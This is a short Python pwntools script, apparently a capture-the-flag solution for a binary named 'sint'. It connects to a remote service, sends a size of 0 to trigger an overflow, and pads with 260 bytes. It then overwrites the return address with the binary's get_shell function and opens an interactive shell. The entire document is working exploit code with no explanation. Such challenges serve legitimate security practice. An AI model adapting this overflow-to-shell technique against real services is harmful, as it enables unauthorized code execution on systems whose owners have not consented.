from pwn import *
p = remote(주소, PORT)
e = ELF("./sint")
get_shell = e.symbols["get_shell"]
p.sendlineafter("Size: ", '0')
payload = b'A' * 260
payload += p32(get_shell)
p.sendlineafter("Data: ", payload)
p.interactive()